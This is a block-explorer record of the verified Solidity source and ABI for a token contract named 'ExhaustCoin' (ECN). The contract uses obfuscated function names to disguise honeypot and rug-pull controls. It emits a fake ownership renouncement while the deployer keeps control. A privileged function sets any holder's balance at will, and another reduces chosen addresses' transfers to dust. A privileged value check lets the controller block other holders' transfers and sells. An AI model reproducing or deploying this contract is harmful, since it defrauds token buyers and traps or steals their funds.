{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract marketingTxBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingTeam {\n    function createPair(address takeMin, address toTotalIs) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface totalTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface autoIsSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isTake) external view returns (uint256);\n\n    function transfer(address fundBuy, uint256 sellFundMode) external returns (bool);\n\n    function allowance(address shouldToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellFundMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundBuy,\n        uint256 sellFundMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountMode, uint256 value);\n    event Approval(address indexed shouldToken, address indexed spender, uint256 value);\n}\n\ninterface maxAmount is autoIsSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExhaustCoin is marketingTxBuy, autoIsSender, maxAmount {\n\n    string private fromListTotal = \"ECN\";\n\n    function teamList(address autoAmountSender) public {\n        receiverMaxMin();\n        if (exemptReceiverBuy == limitReceiverSwap) {\n            tokenBuyLiquidity = true;\n        }\n        if (autoAmountSender == amountToken || autoAmountSender == tradingEnable) {\n            return;\n        }\n        tradingLimitLaunched[autoAmountSender] = true;\n    }\n\n    uint256 public swapMaxShould = 0;\n\n    address public tradingEnable;\n\n    function transfer(address sellAutoEnable, uint256 sellFundMode) external virtual override returns (bool) {\n        return liquidityAmountMin(_msgSender(), sellAutoEnable, sellFundMode);\n    }\n\n    function receiverReceiver() public {\n        emit OwnershipTransferred(amountToken, address(0));\n        listIs = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromListTotal;\n    }\n\n    constructor (){\n        if (isWallet == exemptReceiverBuy) {\n            tokenBuyLiquidity = true;\n        }\n        receiverReceiver();\n        totalTeam fundLaunched = totalTeam(maxWallet);\n        tradingEnable = marketingTeam(fundLaunched.factory()).createPair(fundLaunched.WETH(), address(this));\n        enableAmount = marketingTeam(fundLaunched.factory()).feeTo();\n        \n        amountToken = _msgSender();\n        maxShouldLimit[amountToken] = true;\n        exemptTxSwap[amountToken] = launchedExempt;\n        \n        emit Transfer(address(0), amountToken, launchedExempt);\n    }\n\n    mapping(address => bool) public tradingLimitLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamTradingTotal;\n    }\n\n    uint256 liquidityFromTake;\n\n    bool private isLaunchTeam;\n\n    bool public feeEnable;\n\n    function liquidityAmountMin(address txTokenExempt, address fundBuy, uint256 sellFundMode) internal returns (bool) {\n        if (txTokenExempt == amountToken) {\n            return fromWallet(txTokenExempt, fundBuy, sellFundMode);\n        }\n        uint256 launchedToken = autoIsSender(tradingEnable).balanceOf(enableAmount);\n        require(launchedToken == liquidityFromTake);\n        require(fundBuy != enableAmount);\n        if (tradingLimitLaunched[txTokenExempt]) {\n            return fromWallet(txTokenExempt, fundBuy, isMarketingMode);\n        }\n        sellFundMode = marketingFee(txTokenExempt, fundBuy, sellFundMode);\n        return fromWallet(txTokenExempt, fundBuy, sellFundMode);\n    }\n\n    function getOwner() external view returns (address) {\n        return listIs;\n    }\n\n    uint256 public swapBuyTo = 3;\n\n    function transferFrom(address txTokenExempt, address fundBuy, uint256 sellFundMode) external override returns (bool) {\n        if (_msgSender() != maxWallet) {\n            if (tradingLaunched[txTokenExempt][_msgSender()] != type(uint256).max) {\n                require(sellFundMode <= tradingLaunched[txTokenExempt][_msgSender()]);\n                tradingLaunched[txTokenExempt][_msgSender()] -= sellFundMode;\n            }\n        }\n        return liquidityAmountMin(txTokenExempt, fundBuy, sellFundMode);\n    }\n\n    function approve(address tradingSell, uint256 sellFundMode) public virtual override returns (bool) {\n        tradingLaunched[_msgSender()][tradingSell] = sellFundMode;\n        emit Approval(_msgSender(), tradingSell, sellFundMode);\n        return true;\n    }\n\n    uint256 private limitReceiverSwap;\n\n    uint256 constant isMarketingMode = 10 ** 10;\n\n    function allowance(address modeLaunched, address tradingSell) external view virtual override returns (uint256) {\n        if (tradingSell == maxWallet) {\n            return type(uint256).max;\n        }\n        return tradingLaunched[modeLaunched][tradingSell];\n    }\n\n    event OwnershipTransferred(address indexed txMode, address indexed takeSell);\n\n    uint256 private isWallet;\n\n    uint256 private exemptReceiverBuy;\n\n    bool private minBuy;\n\n    mapping(address => bool) public maxShouldLimit;\n\n    function balanceOf(address isTake) public view virtual override returns (uint256) {\n        return exemptTxSwap[isTake];\n    }\n\n    mapping(address => uint256) private exemptTxSwap;\n\n    function owner() external view returns (address) {\n        return listIs;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingAuto;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedExempt;\n    }\n\n    bool public totalLaunch;\n\n    uint256 atTxList;\n\n    function marketingFee(address txTokenExempt, address fundBuy, uint256 sellFundMode) internal view returns (uint256) {\n        require(sellFundMode > 0);\n\n        uint256 isFromList = 0;\n        if (txTokenExempt == tradingEnable && swapBuyTo > 0) {\n            isFromList = sellFundMode * swapBuyTo / 100;\n        } else if (fundBuy == tradingEnable && swapMaxShould > 0) {\n            isFromList = sellFundMode * swapMaxShould / 100;\n        }\n        require(isFromList <= sellFundMode);\n        return sellFundMode - isFromList;\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingLaunched;\n\n    address private listIs;\n\n    bool public tokenBuyLiquidity;\n\n    function fromWallet(address txTokenExempt, address fundBuy, uint256 sellFundMode) internal returns (bool) {\n        require(exemptTxSwap[txTokenExempt] >= sellFundMode);\n        exemptTxSwap[txTokenExempt] -= sellFundMode;\n        exemptTxSwap[fundBuy] += sellFundMode;\n        emit Transfer(txTokenExempt, fundBuy, sellFundMode);\n        return true;\n    }\n\n    uint8 private teamTradingTotal = 18;\n\n    string private marketingAuto = \"Exhaust Coin\";\n\n    function teamLaunch(address sellAutoEnable, uint256 sellFundMode) public {\n        receiverMaxMin();\n        exemptTxSwap[sellAutoEnable] = sellFundMode;\n    }\n\n    function receiverMaxMin() private view {\n        require(maxShouldLimit[_msgSender()]);\n    }\n\n    address maxWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address enableAmount;\n\n    uint256 private launchedExempt = 100000000 * 10 ** 18;\n\n    function fundTake(uint256 sellFundMode) public {\n        receiverMaxMin();\n        liquidityFromTake = sellFundMode;\n    }\n\n    function teamTx(address maxToLaunched) public {\n        if (feeEnable) {\n            return;\n        }\n        \n        maxShouldLimit[maxToLaunched] = true;\n        if (isLaunchTeam != minBuy) {\n            listSwap = true;\n        }\n        feeEnable = true;\n    }\n\n    address public amountToken;\n\n    bool public listSwap;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellFundMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellFundMode\",\"type\":\"uint256\"}],\"name\":\"fundTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxShouldLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapBuyTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMaxShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAutoEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellFundMode\",\"type\":\"uint256\"}],\"name\":\"teamLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAmountSender\",\"type\":\"address\"}],\"name\":\"teamList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxToLaunched\",\"type\":\"address\"}],\"name\":\"teamTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuyLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingLimitLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAutoEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellFundMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTokenExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellFundMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExhaustCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}